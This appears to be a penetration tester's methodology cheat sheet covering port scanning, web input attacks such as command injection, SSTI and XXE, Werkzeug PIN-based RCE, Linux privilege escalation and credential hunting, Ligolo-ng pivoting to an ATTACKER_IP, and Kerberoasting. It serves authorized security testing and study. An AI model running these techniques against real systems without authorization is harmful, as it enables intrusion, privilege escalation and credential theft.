2. Note assessment type: External PT? Internal? Web App? Red Team?

6. Confirm VPN is connected and stable

LAYER 1 Host & Port Discovery
Scanning Order — always follow this sequence
STEP 1  Fast TCP (top 1000 ports)     → Quick wins, get your bearings
STEP 2  Full TCP ALL 65535 ports       → Run in background. Services hide on high ports.
STEP 3  Version + script on OPEN ports → Not all ports. Only open ones.
STEP 4  UDP top 100                    → SNMP(161), NFS(111), TFTP(69), DNS(53) — always ignored, always matter
STEP 5  Save ALL output                → grepable, xml, normal — you'll grep it later

Input Testing — Vulnerability by Input Type
References a file? (page=, file=, include=, path=, doc=)
  → LFI / Path Traversal

DB query-like? (id=, search=, filter=, sort=)
  → SQL Injection (single quote test first)
  → Test ORDER BY, pagination, AND COOKIES

Reflects in page output?
  → XSS (in context: HTML body, attribute, JavaScript)

Sequential ID you control? (user_id=9, order=1234)
  → IDOR — change the number, try other users

Might touch OS? (host=, cmd=, ping=, lookup=, exec=)
  → Command injection (;id, |id, &&id, `id`, $(id))

Template syntax in output? ({{, ${, <%=)
  → SSTI — try {{7*7}}, if 49 returned = SSTI

Accepts XML?
  → XXE — external entity to /etc/passwd

Generates document/PDF from input?
  → HTML/JS injection → possible SSRF / local file read

API JSON body with role/permission fields?
  → Business logic → "role":"admin", "isAdmin":true

Werkzeug Debug Console (Flask)
Found Flask app → visit /console
    ↓
Open without PIN? → Python RCE immediately
    ↓
Needs PIN → calculate it using:
  1. Username running the app (/proc/self/environ)
  2. Flask module path (find via LFI or error messages)
  3. MAC address of primary interface
     → /sys/class/net/<interface>/address → hex to decimal int
  4. Machine ID
     → Visit /error on the app → leaked directly
     → Also: /etc/machine-id or /proc/sys/kernel/random/boot_id
    ↓
Run PIN generation script → enter in /console → RCE
NOTE: Newer Werkzeug uses sha1() not md5()

PrivEsc Decision Flow — Work Top to Bottom
TIER 1 — Check in 2 min
  • sudo -l → anything → GTFOBins
  • docker group → instant root (mount host FS)
  • lxd/lxc group → instant root
  • disk group → debugfs → read /etc/shadow

  • video group → read framebuffer

  • find / -perm -u=s -type f 2>/dev/null
  • Non-standard SUID → GTFOBins

TIER 3 — Credentials (5 min)
  • ~/.bash_history → typed passwords
  • /opt/ → ALWAYS. Custom apps = hardcoded creds
  • find / -name ".env" 2>/dev/null
  • find / -name "wp-config.php"
  • aureport --tty (if adm group)
TIER 4 — Services & Cron (10 min)
  • ss -tulpn → internal root ports → forward + exploit
  • cat /etc/crontab → writable scripts?
  • ls /etc/cron.* → all cron directories
  • Writable script run by root? → add shell
TIER 5 — Last Resort: NFS & Kernel

Ligolo-ng — Full Setup
ATTACKER:
  sudo ip tuntap add user $(whoami) mode tun ligolo
  sudo ip link set ligolo up
  ./proxy -selfcert -laddr 0.0.0.0:11601

PIVOT (Linux):   ./agent -connect ATTACKER_IP:11601 -ignore-cert

DOUBLE PIVOT:

⚠ SYNC CLOCK FIRST — ALWAYS

DANGER Things That Kill You
Clock Sync

Kerberos fails silently. Error looks like wrong password. Sync before every AD engagement: sudo ntpdate -u DC_IP

Credential Reuse

Every password found ANYWHERE goes into your credentials list and gets tried on every service. One reused password = the chain.

VHost Brute Force

Zone transfer gives obvious subdomains. VHost brute finds dev/staging/uat never in DNS. Run both with multiple wordlists — they find different things.

GitLab/Gogs Registration

Open registration → register → browse all projects → internal subdomains, hardcoded credentials, API keys, infrastructure details.

HTTP Verb Tampering

403 on endpoint? Try OPTIONS, TRACK, PUT, PATCH, DELETE. Different verbs can reveal headers or bypass access controls entirely.

NFS is Treasure

Internally mounted NFS shares almost always have interesting files: config files with DB passwords, SSH keys, application backups. Mount everything.

adm Group = Credentials in Logs

aureport --tty shows everything ever typed in a terminal — passwords typed during su or service configuration are all there.

BloodHound Without Owned Nodes

If you haven't marked everything you control as owned, paths won't show. Mark every compromised account and host as you gain access.

Second NICs After DA

After Domain Admin, check ipconfig /all on the DC. A second NIC to a management/isolated network is extremely common and extremely valuable.

Werkzeug PIN

Debug mode doesn't mean open console. Calculate: username + MAC address (hex→decimal) + machine ID from /error or /etc/machine-id. Newer versions use sha1 not md5.

API Role Fields

The API trusts what you send. {"role":"admin"} to an update endpoint, re-login, check if it worked. Test every field in every JSON body.

.Cred Files

PowerShell credential objects. Decryptable only as the creating user. If you're running as them: Import-CliXml → .GetNetworkCredential().Password = plaintext.

Duplicati/Backup UIs

Backup software runs as root/SYSTEM. Reach the web UI → "restore" /root/flag.txt to a readable location without needing a root shell.

Ligolo listener_add

Internal machines can't reach your Kali directly. listener_add --addr 0.0.0.0:PORT --to 127.0.0.1:PORT makes pivot host listen and forward. Use pivot IP as LHOST.

Targeted Kerberoasting

GenericWrite doesn't need to mean password reset. Set fake SPN → Kerberoast → crack offline → silent, no visible account changes.

Document Everything in Real Time

Password resets, group memberships, files uploaded, accounts created. You WILL forget. The client needs the appendix.
